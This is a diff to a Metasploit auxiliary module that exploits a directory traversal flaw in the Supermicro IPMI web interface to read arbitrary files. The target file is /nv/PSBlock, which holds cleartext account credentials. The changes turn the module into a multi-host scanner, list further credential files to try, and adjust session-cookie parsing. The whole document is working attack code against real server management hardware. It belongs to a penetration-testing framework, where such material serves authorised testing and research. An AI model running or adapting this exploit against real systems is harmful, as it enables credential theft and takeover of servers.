@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,7 +9,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+
 
   APP_NAME = "Supermicro web interface"
 
@@ -23,7 +25,8 @@ class Metasploit3 < Msf::Auxiliary
         a valid, but not necessarily administrator-level account, to access the contents of any file
         on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
         all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
-        with firmware version SMT_X9_214.
+        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
+        /wsman/simple_auth.passwd
       },
       'Author'       =>
         [
@@ -33,8 +36,8 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          #[ 'CVE', '' ],
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ]
+          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ],
+          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
       'DisclosureDate' => 'Nov 06 2013'))
 
@@ -75,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       }
     })
 
-    if res and res.code == 200 and res.body.to_s =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.headers["Set-Cookie"].to_s =~ /(SID=[a-z]+)/
+    if res and res.code == 200 and res.body.to_s =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.get_cookies =~ /(SID=[a-z]+)/
       return $1
     else
       return nil
@@ -107,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def run
+  def run_host(ip)
     print_status("#{peer} - Checking if it's a #{APP_NAME}....")
     if is_supermicro?
       print_good("#{peer} - Check successful")
@@ -133,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 
     file_name = my_basename(datastore['FILEPATH'])
     path = store_loot(
-      'supermicro.ipmi.traversal',
+      'supermicro.ipmi.traversal.psblock',
       'application/octet-stream',
       rhost,
       contents,
